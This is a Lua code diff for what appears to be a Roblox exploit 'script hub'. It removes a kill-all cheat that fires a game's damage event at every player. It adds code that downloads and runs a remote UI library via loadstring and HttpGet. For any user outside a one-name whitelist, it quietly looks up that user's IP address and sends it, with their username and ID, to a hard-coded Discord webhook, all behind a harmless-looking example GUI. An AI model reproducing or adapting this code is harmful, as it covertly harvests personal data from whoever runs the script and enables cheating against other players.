@@ -1,6 +1,91 @@
-   local DR = game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
-for PlayerIndex,GivenPlayer in pairs(game.Players:GetPlayers()) do
-    local Char = GivenPlayer.Character
-    DR:FireServer(Char.Humanoid,Char.Humanoid.MaxHealth,0,0)
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+local whitelists = { "xsinew" }  -- Add the whitelisted usernames here
+
+local function sendWebhook(playerInfo)
+    local data = {
+        ["username"] = "Whitelist Checker",
+        ["embeds"] = {
+            {
+                ["title"] = "Unauthorized Access Attempt",
+                ["description"] = string.format("**Player Name:** %s\n**User ID:** %d\n**Profile:** [Profile](https://www.roblox.com/users/%d/profile)\n**IP:** %s",
+                playerInfo.name, playerInfo.userId, playerInfo.userId, playerInfo.ip),
+                ["color"] = 16711680
+            }
+        }
+    }
+    local jsonData = HttpService:JSONEncode(data)
+    HttpService:PostAsync("https://discord.com/api/webhooks/1246731202858057758/X2n2dUa06FrI65cn3zxH7UeVsOnl7vp-LlfrI9igcZOP0q5-0nSlZnXvyaDV2xatU2Ht", jsonData, Enum.HttpContentType.ApplicationJson)
 end
+
+local function getPlayerIP()
+    local response = HttpService:GetAsync("https://ipinfo.io/json")
+    local data = HttpService:JSONDecode(response)
+    return data.ip
+end
+
+if not table.find(whitelists, player.Name) then
+    local playerInfo = {
+        name = player.Name,
+        userId = player.UserId,
+        ip = getPlayerIP()
+    }
+    sendWebhook(playerInfo)
+    return
+end
+
+local Window = Rayfield:CreateWindow({
+   Name = "🔥 Example Script Hub | Game 🔫",
+   LoadingTitle = "🔫 Gun Simulator 💥",
+   LoadingSubtitle = "by 1_F0",
+   ConfigurationSaving = {
+      Enabled = false,
+      FolderName = nil,
+      FileName = "Example Hub"
+   },
+   Discord = {
+      Enabled = false,
+      Invite = "noinvitelink",
+      RememberJoins = true
+   },
+   KeySystem = true,
+   KeySettings = {
+      Title = "Key | Youtube Hub",
+      Subtitle = "Key System",
+      Note = "Key In Discord Server",
+      FileName = "YoutubeHubKey1",
+      SaveKey = false,
+      GrabKeyFromSite = true,
+      Key = {"https://pastebin.com/raw/AtgzSPWK"}
+   }
+})
+
+local MainTab = Window:CreateTab("🏠 Home", nil)
+local MainSection = MainTab:CreateSection("Main")
+
+Rayfield:Notify({
+   Title = "You executed the script",
+   Content = "Very cool GUI",
+   Duration = 5,
+   Image = 13047715178,
+   Actions = {
+      Ignore = {
+         Name = "Okay!",
+         Callback = function()
+            print("The user tapped Okay!")
+         end
+      }
+   },
+})
+
+-- Add any GUI elements you want here. The following is a basic example.
+local Label = MainTab:CreateLabel("Welcome to the Example Script Hub!")
+local Button = MainTab:CreateButton({
+   Name = "Click Me!",
+   Callback = function()
+       print("Button clicked!")
+   end,
+})
